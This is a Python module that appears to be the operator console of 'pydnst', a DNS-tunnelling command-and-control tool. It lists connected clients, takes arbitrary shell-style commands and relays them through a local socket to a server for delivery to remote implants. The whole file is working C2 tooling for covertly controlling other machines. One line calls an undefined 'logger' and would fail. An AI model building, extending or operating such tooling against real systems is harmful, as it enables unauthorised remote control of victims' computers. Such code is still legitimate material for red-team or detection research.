import os
import time
import json
import socket
from struct import Struct
from subprocess import call
import toml
import sys
try:
    from rich.live import Live as rich_live
    from rich import json as rich_json
    from rich import print as rich_print
    from rich.prompt import Prompt as rich_prompt
except Exception:
    pass

from .helpers import get_logger

PATH_CONFIG = 'pydnst.toml'
MSG_2_STRUCT = Struct('H') #2 bytes
MAX_COMMAND_LENGTH = 1000

class Commander:
    def __init__(self):
        self.logger = get_logger(logfile_path='pydnst_c2.log', logger_name='pydnst_c2')
        self.logger.info('Commander started')
        if not os.path.exists(PATH_CONFIG):
            logger.info(f'No config file at {PATH_CONFIG}, leaving ...')
            sys.exit(1)    
        with open(PATH_CONFIG,'r') as fd:
            config_toml = toml.load(fd)
        self.MESSAGES_JSON = config_toml['server']['MESSAGES_JSON']
        self.UDS_PATH_COMMANDER = config_toml['server']['UDS_PATH_COMMANDER']        

    def send_command(self, cmd, client_id):
        try:
            self.logger.info(f'Send to DnstServer : command {cmd[:100]} for client {client_id}')
            #command format : {'client_id':'', 'command':''}            
            payload = json.dumps({'client_id':client_id, 'command':cmd})
            header = MSG_2_STRUCT.pack(len(payload))
            message = header + payload.encode()
            sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            sock.connect(self.UDS_PATH_COMMANDER)            
            sock.sendall(message)
            resp = sock.recv(1000)  #just reads the "ok" response
            self.logger.info(f'Got {resp.decode()} from DnstServer')
            sock.close()
            self.logger.info('Command was sent to DnstServer')            
        except Exception:
            self.logger.exception('send_command')

    def rich_generate_json(self):
        res = json.dumps(self.get_info())
        res = rich_json.JSON(res)
        return res
                
    def rich_live_display_commands(self):
        call(['clear'])
        rich_print('[b]Welcome to pydnst C2 :alien_monster:')        
        rich_print('Live commands status (type ctrl-C to go back)')
        try:
            with rich_live(refresh_per_second=0.4) as live:
                while True:
                    try:
                        live.update(self.rich_generate_json())
                    except Exception as exc:
                        self.logger.exception('rich_generate_json')
                        res = json.dumps({"failure":str(exc)})
                        live.update(rich_json.JSON(res))
                        time.sleep(1)
                        raise
                    time.sleep(1)
        except:
            pass
        
    def get_info(self):
        messages_info = None
        if not os.path.exists(self.MESSAGES_JSON):
            return {}
        with open(self.MESSAGES_JSON, 'r') as fd:
            messages_info = json.load(fd)
        return messages_info    
    
    def show_clients(self, messages_info=None):
        if not messages_info:
            messages_info = self.get_info()
        return list(messages_info.keys())
    
    def dialog(self):
        while True:
            call(['clear'])
            rich_print('[b]Welcome to pydnst C2 :alien_monster:')            
            choice = rich_prompt.ask('\nShow commands status (s) / Send a new command (c) / Quit (q)', choices=['s', 'c', 'q'])
            if choice == 's':
                self.rich_live_display_commands()
            elif choice == 'c':
                clients = self.show_clients()
                client_id = rich_prompt.ask(f'\nPlease select a client (or "q" to cancel) : {clients}')
                if client_id == 'q':
                    continue
                if client_id not in clients:
                    rich_print(f'Invalid client {client_id}')
                    break
                command = rich_prompt.ask(f'\nPlease enter your command for client {client_id} (or "q" to cancel)')
                if command == 'q':
                    continue
                command = command[:MAX_COMMAND_LENGTH]
                self.send_command(command, client_id)
                self.rich_live_display_commands()
            elif choice == 'q':
                self.logger.info('Quitting')
                return
    
    def run(self):
        try:
            self.dialog()
        except Exception:
            self.logger.exception('run')
        except:
            self.logger.info('Commander stopped')
